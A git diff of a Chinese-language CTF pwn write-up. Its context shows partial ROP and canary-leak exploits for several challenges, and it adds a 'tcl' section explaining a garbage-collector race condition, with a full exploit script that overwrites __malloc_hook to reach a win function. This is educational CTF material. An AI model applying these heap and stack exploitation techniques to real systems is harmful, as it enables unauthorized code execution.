@@ -10,8 +10,6 @@ date: 2025-05-23
 
 <!--truncate-->
 
-
-
 ## GOAT
 
 ![image-20250523000531559](https://oss.nova.gal/img/image-20250523000531559.png)
@@ -42,8 +40,6 @@ sla(b"What's your name? ", payload)
 sla(b"\n", "/bin/sh\x00")
 ia()
 ```
-
-
 
 ## minecraft_youtube
 
@@ -91,8 +87,6 @@ ia()
 
 题目没给 libc，看了一眼 Dockerfile 是拉的 ubuntu，所以应该和我 Arch 大差不差。
 
-
-
 ## game-of-yap
 
 两次栈溢出，但是保护开的比较多。有两个后门函数肯定是要用的。![image-20250523004310935](https://oss.nova.gal/img/image-20250523004310935.png)
@@ -101,19 +95,13 @@ yap 用来 leak binary 地址，nothing 用来做 gadget，关键是拿来干什
 
 这个时候的 rsi 就说我们 read 的 buf 指针，因此如果是 system 那直接执行了，问题是我们需要 leak libc 地址。
 
-
-
 我们其实可以考虑跳到 yap 中间，但这个时候 rsi 指向的是 buf。前面如果有 gadget 可以把一个 libc 搞到 rsi 也可以。观察后，发现显然并没有这么好用的 gadget，难点在于这个 gadget 要**不破坏 rsp 地址的情况下 retn 从而继续我们的 rop chain**
 
 既然 rdi 是我们可控的，我们观察函数列表，看看有什么能用的，显然是 printf。
 
-
-
 因此我们 partial overwrite leak binary，然后 rop 到 printf leak libc，回到 libc_start_main 再来一次 system binsh 即可。
 
 注意，这里我们第一次跳转到 yap + 8 的地方，这样的话他就不会开一个新的栈帧，从而在 pop rbp, retn 的时候回到 main 去。
-
-
 
 ```python
 from pwno import *
@@ -158,8 +146,6 @@ sa(
 ia()
 ```
 
-
-
 ## mips
 
 异构 mips32 题，两次读一次溢出，有后门函数，感觉难点在怎么打开和调试（笑
@@ -172,12 +158,10 @@ ia()
 
 在栈上，就是用 $fp 来指向 canary，最后返回到 $ra
 
-
-
 由于没有开启 pie，那么 $gp - 0x7fb0 这个值就是固定的 0x420060，这样就可以通过
 
-1. 读 0x420060 拿 __stack_chk_guard 指针
-2. 读 __stack_chk_guard 拿 canary
+1. 读 0x420060 拿 \_\_stack_chk_guard 指针
+2. 读 \_\_stack_chk_guard 拿 canary
 
 的方式 leak canary，而不用 leak 栈地址再 leak canary。
 
@@ -282,3 +266,113 @@ p.interactive()
 
 ```
 
+## tcl
+
+race 题，这题符号基本都留着了，汇编还是挺好看的。
+
+首先它开了一个 5s 一运行的垃圾回收线程，它查找所有 refcnt == 0 的 obj，放入一个局部数组中，然后首先 free 掉它们（每个间隔 0x1388 us），free 完再去遍历一遍数组，确认 refcnt == 0 才 set null。这里显然有一个攻击窗口，当我们待回收的数组较大，那么第一个 free 和 setnull 之间就会有 0x1388 \* len us 的窗口可供利用。如果我们能够趁这个时候把其中一个已经 free 但是还没改为 null 的 refcnt 增加，它就不会被 set null，从而留存一个 dangling pointer。
+
+![image-20250523102739500](https://oss.nova.gal/img/image-20250523102739500.png)
+
+观察 refcnt 增加的条件。int 类型的只要是数字相同即可，比较符合我们的需求，但是注意的是它是 `key = value` 的形式，`key` 本身会调用 strdup 拿一个 chunk，因此，为了 chunk 好看一些，我们最好都用相同的 key，这样只会创建一个 chunk 用于存储 key，一个 obj 用于存储 string object，其他的都可以拿来作 int object。
+
+理想情况是这样的：我们首先分配 1+80 个 chunk，在第一次 gc 的时候，它即将释放掉所有 obj，并且将指针清空。我们在它释放第 40 个 chunk 时进行第二次输入，分配 1 + 10 个 chunk。它们会拿到 0-10 号 chunk（对应 0-9 obj），并且分配在 idx 80-89 上。
+
+紧接着，gc 继续进行，free 完剩下的 obj，并且指针置空。此时由于 0-9 obj refcnt = 1，因此不会被置空。此次 gc 结束后，我们拥有了 0-9 obj 和 80-89 obj，它们指向相同的内存。
+
+随后，第二次 gc 进行，它会最终形成一个形如 fastbin->9->8->7->...->1->0->9->8->... 的循环链表。此时，我们拿取前 10 个，将其 fd 修改为 malloc_hook，再拿取后 10 个，将其改为后门，即可完成 race condition 的利用。
+
+例如，在这种情况下，我们就找到了一组对应。
+
+![image-20250523124018264](https://oss.nova.gal/img/image-20250523124018264.png)
+
+非常巧合的，我们这个 loop 相隔非常近，因此我们能直接当 double free 来做。
+
+![image-20250523124452589](https://oss.nova.gal/img/image-20250523124452589.png)
+
+随便调调就出来了。
+
+![image-20250523132631458](https://oss.nova.gal/img/image-20250523132631458.png)
+
+不过这个 exp 没法正常打，我不在这个地方加 dbg() 这个 gc 时机就不对（笑），而且这里如果是 sleep 5 的话第一次 gc 早就过了，我测试在大概 4.5s 左右。
+
+```python
+from pwno import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+gdb.binary = lambda: "/usr/bin/gdb-gef"
+
+sh = gen_sh()
+
+libc.address = int(recvl()[:-1], 16) - libc.sym["alarm"]
+
+payload = b"#START\n"
+
+for i in range(80):
+    payload += b"A" * 0x20 + b" = "  # different size, easier to exploit
+    payload += str(i).encode()
+    payload += b"\n"
+payload += b"#END\n"
+
+sa(b"===\n", payload)
+
+# make sure obj0 and str chunk will not be freed.
+payload = b"#START\n"
+payload += b"A" * 0x20 + b" = "
+payload += str(114514).encode()
+payload += b"\n"
+sa(b"===\n", payload)
+recv()
+sleep(5 + 0.005 * 50)
+
+payload = b""
+for i in range(10):
+    payload += b"A" * 0x20 + b" = "
+    payload += str(1919810 + i).encode()
+    payload += b"\n"
+send(payload)
+dbg("b *0x401055\np/x (void*[100])objects\nc", s=-1)
+
+payload = b"#END\n"
+send(payload)
+recv()
+
+sleep(5)
+payload = b"#START\n"
+for i in range(14):
+    payload += b"A" * 0x20 + b" = "
+    payload += str(2333 + i).encode()
+    payload += b"\n"
+
+success(libc.address)
+pause()
+send(payload)
+
+payload = b"A" * 0x20 + b" = "
+payload += str(libc.sym["__malloc_hook"]).encode()
+payload += b"\n"
+
+payload += b"A" * 0x20 + b" = "
+payload += str(6666).encode()
+payload += b"\n"
+
+payload += b"A" * 0x20 + b" = "
+payload += str(6657).encode()
+payload += b"\n"
+
+payload += b"A" * 0x20 + b" = "
+payload += str(elf.sym["win"]).encode()
+payload += b"\n"
+
+pause()
+# b *0x400EF5
+payload += b"A" * 0x20 + b" = "
+payload += str(0xDEADBEEF).encode()
+payload += b"\n"
+
+send(payload)
+ia()
+
+```
+
+至于正统的是真没法打，完全不知道它是在什么时候 gc 的，试了个 sleep(5-i\*0.05) 从 -100 到 100 也没打出报错，感觉不容易，更别提在报错之后去测哪里开始循环了，放弃！
